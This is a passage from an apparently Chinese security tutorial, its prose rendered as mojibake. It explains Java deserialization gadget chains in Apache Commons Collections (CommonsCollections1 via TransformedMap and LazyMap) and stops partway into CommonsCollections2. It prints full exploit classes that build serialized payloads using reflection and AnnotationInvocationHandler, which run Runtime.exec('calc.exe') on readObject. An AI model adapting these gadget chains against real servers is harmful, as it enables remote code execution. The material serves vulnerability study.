transformed value * @since Commons Collections 3.1 */ protected Object checkSetValue(Object value) {//1 return this.valueTransformer.transform(value);//2 } è¯¥ç±»æ˜¯å¯¹ä¸Šæ–‡AbstractInputCheckedMapDecoratorçš„ç»§æ‰¿ï¼Œå®ç°äº†checkSetValueã€‚\nè¯¥ç±»è¿˜ä¸PoCä¸­Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain)â€‹æœ‰å…³ã€‚\nPoCä¸­æ„é€ çš„transformerså˜é‡å…ˆåˆ°transformerChainå†åˆ°outerMapï¼ŒouterMapæ˜¯TransformedMapç±»å‹çš„ä¸€ä¸ªå®ä¾‹ã€‚\n2å¤„çš„transformæ˜¯æ¥å£Transformerä¸­å®šä¹‰çš„ç±»ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šæ ¹æ®å®ä¾‹è°ƒç”¨å¯¹åº”çš„å®ç°ã€‚\ntransformå¯¹åº”çš„å®ç°æœ‰21ä¸ªå¦‚ä¸‹ï¼š\nâ€‹â€‹\næ ¹æ®PoCä¸­çš„ä»£ç ï¼Œè¿™é‡Œä¼šè¿è¡ŒChainedTransformerç±»å®ç°çš„transformã€‚\nChainedTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // org. apache. commons. collections. functors. ChainedTransformer implements Transformer private final Transformer[] iTransformers; /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) {//1 for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object);//2 } return object; } ChainedTransformerå®ç°äº†Transformeræ¥å£ï¼Œå®ç°äº†transformã€‚\n2å¤„çš„transformä¹Ÿæ˜¯æ¥å£Transformerä¸­å®šä¹‰çš„ç±»ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šæ ¹æ®å®ä¾‹è°ƒç”¨å¯¹åº”çš„å®ç°ã€‚\ntransformå¯¹åº”çš„å®ç°æœ‰21ä¸ªå¦‚ä¸‹ï¼š\nâ€‹â€‹\næ ¹æ®PoCä¸­transformerså˜é‡çš„å®šä¹‰ï¼Œè¯¥å¾ªç¯ä¼šå…ˆè°ƒç”¨ä¸€æ¬¡ConstantTransformerä¸­å®ç°çš„transformï¼Œå†è°ƒç”¨ä¸‰æ¬¡InvokerTransformerä¸­å®ç°çš„transformã€‚\nConstantTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // org. apache. commons. collections. functors. ConstantTransformer implements Transformer private final Object iConstant; public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) {//1 return this.iConstant;//2 } æ ¹æ®PoCä¸­new ConstantTransformer(Runtime.class)â€‹ï¼Œ2å¤„è¿”å›çš„æ˜¯java.lang.Runtimeã€‚\nç”±æ­¤å¯è§PoCä¸­onlyElement.setValue(\u0026quot;foobar\u0026quot;)â€‹ï¼Œå€¼ä¸ºå¤šå°‘éƒ½æ— æ‰€è°“ã€‚\nInvokerTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // org. apache. commons. collections. functors. InvokerTransformer private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; /** * Constructor that performs no validation. * Use \u0026lt;code\u0026gt;getInstance\u0026lt;/code\u0026gt; if you want that. * * @param methodName the method to call * @param paramTypes the constructor parameter types, not cloned * @param args the constructor arguments, not cloned */ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } /** * Transforms the input to result by invoking a method on the input. * * @param input the input object to transform * @return the transformed result, null if null input */ public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass();//1 Method method = cls.getMethod(iMethodName, iParamTypes);//2 return method.invoke(input, iArgs);//3 } catch (NoSuchMethodException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } æ­¤å¤„æ˜¯æ•´ä¸ªPoCçš„å…³é”®ï¼Œå…³é”®ä»£ç æ˜¯1ã€2ã€3å¤„ï¼Œè¿™é‡Œå’Œä¸Šé¢çš„java.lang.Runtimeæœ€ç»ˆæ„æˆäº†Runtime.getRuntime().exec(\u0026ldquo;calc.exe\u0026rdquo;)ã€‚\nä¸‹é¢é‡ç‚¹åˆ†ææ­¤å¤„ä»£ç ã€‚\nPoCæ„é€ åˆ†æ é€šè¿‡åå°„å®ç°Runtime.getRuntime().exec(\u0026ldquo;calc.exe\u0026rdquo;) éœ€è¦äº†è§£Javaåå°„ä»¥åŠforNameã€getMethodã€invokeå‡½æ•°ã€‚\nä¸‹é¢ä¸»è¦çœ‹ä¸‹æºç é‡Œå¯¹è¿™ä¸‰ä¸ªå‡½æ•°çš„æ³¨é‡Šæè¿°ã€‚\nforName 1 2 3 4 5 6 7 8 9 10 11 /** * Returns the Class object associated with the class or interface with the given string name. * @param className the fully qualified name of the desired class. * @return the Class object for the class with the specified name. */ @CallerSensitive public static Class\u0026lt;?\u0026gt; forName(String className) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); return forName0(className, true, ClassLoader.getClassLoader(caller), caller); } getMethod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 /** * Returns a Method object that reflects the specified public member method of the class or interface represented by this Class object. * The name parameter is a String specifying the simple name of the desired method. * The parameterTypes parameter is an array of Class objects that identify the method\u0026#39;s formal parameter types, in declared order. * If parameterTypes is null, it is treated as if it were an empty array. * * Static methods declared in superinterfaces of the class or interface * represented by this Class object are not considered members of * the class or interface. * * @param name the name of the method * @param parameterTypes the list of parameters * @return the Method object that matches the specified name and parameterTypes */ @CallerSensitive public Method getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) throws NoSuchMethodException, SecurityException { checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true); Method method = getMethod0(name, parameterTypes, true); if (method == null) { throw new NoSuchMethodException(getName() + \u0026#34;.\u0026#34; + name + argumentTypesToString(parameterTypes)); } return method; } invoke 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * Invokes the underlying method represented by this Method * object, on the specified object with the specified parameters. * * If the underlying method is static, then the specified obj argument is ignored. It may be null * * @param obj the object the underlying method is invoked from * @param args the arguments used for the method call * @return the result of dispatching the method represented by */ @CallerSensitive public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException { if (!override) { if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); } } MethodAccessor ma = methodAccessor; // read volatile if (ma == null) { ma = acquireMethodAccessor(); } return ma.invoke(obj, args); } å› æ­¤æœ‰\nâ€‹[Runtimeç±»].getMethod([æ–¹æ³•exec]).invoke([Runtimeå®ä¾‹],[å‚æ•°calc.exe])â€‹\nç”±äºRuntimeçš„æ— å‚æ„é€ å‡½æ•°ç”±privateä¿®é¥°ï¼Œå› ä¸ºæ— æ³•ç”¨newInstanceæ„é€ ï¼Œé‡‡ç”¨getRuntimeæ–¹æ³•æ„é€ ã€‚\nå› æ­¤æœ‰åå°„æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(Class.forName(\u0026#34;java.lang.Runtime\u0026#34;))//æ­¤å¤„åœ¨è·å–ç±» , \u0026#34;calc.exe\u0026#34; ); invokeæºç ä¸­å¯¹è¯¥å‡½æ•°æœ‰ä¸€æ®µç‰¹åˆ«é‡è¦çš„æ³¨é‡Šï¼Œå•ç‹¬æ‹¿å‡ºæ¥è¯´ï¼š\nIf the underlying method is static, then the specified obj argument is ignored. It may be null\nå› ä¸ºgetMethodæ˜¯staticæ–¹æ³•ï¼Œå› æ­¤åå°„æ„é€ å¯ä»¥æ”¹å†™ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(null)//æ­¤å¤„åœ¨è·å–ç±» , \u0026#34;calc.exe\u0026#34; ); ä¾æ®åå°„æ„é€ ChainedTransformer InvokerTransformeré‡Œæœ‰ä¸€æ®µé‡è¦ä»£ç æ˜¯æ„é€ çš„å…³é”®ï¼š\n1 2 3 Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); æ”¹é€ ä¸€ä¸‹ä¾¿æ˜¯ï¼š\n1 2 3 input.getClass() .getMethod(iMethodName, iParamTypes) .invoke(input, iArgs) æ ¹æ®è¯¥ç»“æ„æ”¹é€ åå°„æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null).getClass() .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(null) , \u0026#34;calc.exe\u0026#34; ); å³ä¸ºäº†åŒ¹é…æ ·å¼ï¼ŒæŠŠClass.forName(\u0026quot;java.lang.Runtime\u0026quot;)â€‹æ”¹ä¸ºClass.forName(\u0026quot;java.lang.Runtime\u0026quot;).getMethod(\u0026quot;getRuntime\u0026quot;).invoke(null).getClass()â€‹ã€‚\næ ¹æ®ChainedTransformerçš„æºç å¯çŸ¥ï¼Œä¸Šä¸€å±‚transformçš„ç»“æœä¼šæ˜¯è¿™ä¸€å±‚transformçš„å‚æ•°ï¼Œå› æ­¤æœ‰ï¼š\nstep1 1 2 3 4 5 6 7 Object input = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null) return input.getClass() .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke(input, \u0026#34;calc.exe\u0026#34;) new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) step2 1 2 3 4 5 6 7 Object input = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;) return input.getClass() .getMethod(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class}) .invoke(input, new Object[] {null, new Object[0]}) new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}) step3 1 2 3 4 5 6 7 Object input = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) return input.getClass() .getMethod(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class}) .invoke(input, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0]}) new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), step4 1 new ConstantTransformer(Runtime.class) è‡³æ­¤PoCä¸­çš„transformersæ„é€ å®Œæˆ\nExpæ„é€ åˆ†æ Expéœ€è¦å¯¹PoCè¿›è¡Œæ”¹å†™ï¼Œä½¿åªè¦æœåŠ¡ç«¯æ‰§è¡Œäº†readObjectå‡½æ•°å°±ç­‰äºå‘½ä»¤æ‰§è¡Œï¼Œè¿™æ ·æ›´å®¹æ˜“è§¦å‘æ¼æ´ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example.cc; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç  Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina HashMap\u0026lt;Object, Object\u0026gt; innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;hack\u0026#34;); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾ Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); /*Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\u0026#34;foobar\u0026#34;);*/ Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(SuppressWarnings.class, outerMap); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ FileOutputStream fos = new FileOutputStream(\u0026#34;payload.bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); //æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ FileInputStream fis = new FileInputStream(\u0026#34;payload.bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); } } å’ŒPoCç›¸æ¯”ï¼ŒExpä¸»è¦å¢åŠ äº†ä¸€ä¸ªAnnotationInvocationHandlerç±»çš„ä½¿ç”¨ï¼Œä¸‹é¢ä¸»è¦åˆ†æä¸€ä¸‹AnnotationInvocationHandlerç›¸å…³ä»£ç ã€‚\nAnnotationInvocationHandler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 private final Class\u0026lt;? extends Annotation\u0026gt; type; private final Map\u0026lt;String, Object\u0026gt; memberValues; AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; var1, Map\u0026lt;String, Object\u0026gt; var2) { this.type = var1; this.memberValues = var2; } private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey();//1 Class var7 = (Class)var3.get(var6);//2 if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6)));//3 } } } } åœ¨æºç å¤„ä¸‹æ–­ï¼Œè°ƒè¯•ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æ­¤å¤„å„ä¸ªå˜é‡çš„å€¼ï¼š\nâ€‹â€‹\nå¯ä»¥çœ‹åˆ°åœ¨3å¤„ï¼Œè§¦å‘äº†AbstractMapEntryDecoratorçš„è°ƒç”¨ï¼Œè¿™å°±ä¸PoCè°ƒç”¨åˆ†æä¸­çš„AbstractInputCheckedMapDecoratorå¯¹åº”ä¸Šäº†ã€‚\nåœ¨æ„é€ Expæ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„1ã€2å¤„çš„ä»£ç ã€‚\n1å¤„ä»£ç å’ŒExpä¸­çš„innerMap.put(\u0026quot;value\u0026quot;, \u0026quot;hack\u0026quot;);â€‹æœ‰å…³ï¼›2å¤„çš„ä»£ç å’ŒExpä¸­çš„Object o = ctor.newInstance(SuppressWarnings.class, outerMap);â€‹æœ‰å…³ã€‚\nSuppressWarningsç±»çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 @Target({ElementType.TYPE, ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.CONSTRUCTOR, ElementType.LOCAL_VARIABLE}) @Retention(RetentionPolicy.SOURCE) public @interface SuppressWarnings { String[] value(); } å¯è§è‹¥innerMap.putçš„keyå€¼ä¸æ˜¯valueï¼Œæˆ–è€…SuppressWarningsç±»ä¸­æ²¡æœ‰valueæ–¹æ³•ï¼Œ1ã€2å¤„ä»£ç å°±æ— æ³•é¡ºåˆ©æ‰§è¡Œã€‚\né™¤äº†SuppressWarningsç±»ï¼Œè¿˜æœ‰Targetç±»å’ŒRetentionç±»ï¼Œå®ƒä»¬çš„ä»£ç åˆ†åˆ«å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 @Documented @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.ANNOTATION_TYPE}) public @interface Target { ElementType[] value(); } 1 2 3 4 5 6 @Documented @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.ANNOTATION_TYPE}) public @interface Retention { RetentionPolicy value(); } LazyMapé“¾ Expå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example.cc; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1L { public static void main(String[] args) throws Exception { //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç  Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina HashMap\u0026lt;Object, Object\u0026gt; innerMap = new HashMap(); //innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;hack\u0026#34;); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾ Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith); Object o = ctor.newInstance(SuppressWarnings.class, mapProxy); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ FileOutputStream fos = new FileOutputStream(\u0026#34;payload.bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); //æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ FileInputStream fis = new FileInputStream(\u0026#34;payload.bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); } } â€\nExpæ„é€ åˆ†æ LazyMap çŸ¥é“äº†TransformerMapé“¾çš„åŸç†ï¼Œæˆ‘ä»¬å°è¯•é€†è°ƒç”¨é“¾åˆ†æä¸€ä¸‹ã€‚\næ ¹æ®TransformerMapé“¾çš„åˆ†æï¼Œæˆ‘ä»¬éœ€è¦å†æ‰¾ä¸€ä¸ªç±»ï¼Œè°ƒç”¨äº†ChainedTransformerçš„transformeræ–¹æ³•ã€‚\næŸ¥çœ‹ChainedTransformerçš„transformerçš„è°ƒç”¨å…³ç³»ï¼Œå°±å¯ä»¥çœ‹åˆ°LazyMapï¼š\nâ€‹â€‹\nåˆ†æLazyMapæºç ï¼Œè‹¥keyä¸å­˜åœ¨ï¼Œåˆ™è°ƒç”¨Transformerçš„transformæ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 protected final Transformer factory; public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } æ¥ä¸‹æ¥éœ€è¦æ‰¾é‚£é‡Œå¯ä»¥è°ƒç”¨è¿™ä¸ªgetæ–¹æ³•çš„åœ°æ–¹ã€‚\nAnnotationInvocationHandler åœ¨TransformerMapé“¾ä¸­åˆ†æè¿‡ï¼ŒAnnotationInvocationHandlerçš„readObjectæ–¹æ³•åªæœ‰è°ƒç”¨äº†setValueæ–¹æ³•ï¼Œæ²¡æœ‰è°ƒç”¨getæ–¹æ³•ã€‚\né‚£æ˜¯å¦è¿˜æœ‰åˆ«çš„åœ°æ–¹å¯ä»¥åˆ©ç”¨å‘¢ï¼Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 private final Class\u0026lt;? extends Annotation\u0026gt; type; private final Map\u0026lt;String, Object\u0026gt; memberValues; AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; var1, Map\u0026lt;String, Object\u0026gt; var2) { this.type = var1; this.memberValues = var2; } public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; var5.length == 1 \u0026amp;\u0026amp; var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0; if (var4.equals(\u0026#34;toString\u0026#34;)) { return this.toStringImpl(); } else if (var4.equals(\u0026#34;hashCode\u0026#34;)) { return this.hashCodeImpl(); } else if (var4.equals(\u0026#34;annotationType\u0026#34;)) { return this.type; } else { Object var6 = this.memberValues.get(var4);//1 if (var6 == null) { throw new IncompleteAnnotationException(this.type, var4); } else if (var6 instanceof ExceptionProxy) { throw ((ExceptionProxy)var6).generateException(); } else { if (var6.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(var6) != 0) { var6 = this.cloneArray(var6); } return var6; } } } } private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator();//2 while(var4.hasNext()) { Map.Entry var5 = (Map.Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6))); } } } } å‘ç°invokeå‡½æ•°çš„1å¤„ï¼Œè‹¥this.memberValuesæ˜¯LazyMapåˆ™å¯ä»¥è§¦å‘getå‡½æ•°ã€‚\né‚£ä¹ˆå¯ä»¥åˆ©ç”¨AnnotationInvocationHandlerå®ç°äº†InvocationHandlerï¼Œæ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»çš„ç‰¹ç‚¹ï¼Œåˆ›å»ºä¸€ä¸ªLazyMapçš„ä»£ç†ã€‚ï¼ˆåŠ¨æ€ä»£ç†è¯¦è§JavaåŠ¨æ€ä»£ç†ï¼‰\nå³Expä¸­çš„\nâ€‹InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap)â€‹\nâ€‹Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith)â€‹\nå½“mapProxyè°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨å°±ä¼šè¢«è½¬å‘åˆ°å®ç°äº†InvocationHandleræ¥å£ç±»çš„AnnotationInvocationHandlerçš„invokeæ–¹æ³•æ¥è°ƒç”¨ã€‚\nè€ŒreadObjectå‡½æ•°çš„2å¤„ï¼Œåˆšå¥½é€šè¿‡mapProxyè°ƒç”¨äº†entrySetæ–¹æ³•ï¼Œæ­¤æ—¶å°±ä¼šè§¦å‘invokeå‡½æ•°çš„1å¤„ã€‚\nå› æ­¤æœ‰Expä»£ç ä¸­çš„Object o = ctor.newInstance(SuppressWarnings.class, mapProxy)â€‹\nè¿™æ ·æ•´ä¸ªè°ƒç”¨é“¾å°±å®Œæˆäº†ã€‚\npsï¼šæˆ‘ä»¬åœ¨TransformerMapé“¾ä¸­æåˆ°äº†æ„é€ AnnotationInvocationHandlerå®ä¾‹æ—¶è¦ç”¨SuppressWarningsç±»ã€Targetç±»æˆ–Retentionç±»ï¼Œä½†LazyMapé“¾åœ¨2å¤„å³å¯è§¦å‘ï¼Œä¸æ¶‰åŠåé¢çš„ä»£ç ï¼Œå› æ­¤æ­¤å¤„ä»»æ„Annotationç±»çš„ç»§æ‰¿ç±»éƒ½å¯ä»¥ã€‚\nCommonsCollections2 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ commons-collections4 4.0\nPriorityQueueé“¾ Expå±•ç¤º commons-collections4 4.0ä¸­ï¼ŒLazyMapå’ŒTransformedMapæ²¡æœ‰äº†decorateæ–¹æ³•ï¼Œå› æ­¤CommonCollections1ä¸­çš„åˆ©ç”¨é“¾æ— æ³•ä½¿ç”¨ï¼Œéœ€è¦å¦æ‰¾åˆ«çš„åˆ©ç”¨é“¾ã€‚\nCommonCollections2çš„æ€è·¯æ˜¯åˆ›å»ºä¸€ä¸ªç±»ï¼Œåœ¨è¯¥ç±»ä¸­æ„é€ ä¸€ä¸ªåŒ…å«payloadçš„staticä»£ç å—ï¼Œé‚£ä¹ˆJVMåŠ è½½ç±»æ—¶ä¼šæ‰§è¡Œè¿™äº›é™æ€çš„ä»£ç å—ï¼Œå°±ä¼šè§¦å‘payloadã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommomsCollections2 { public 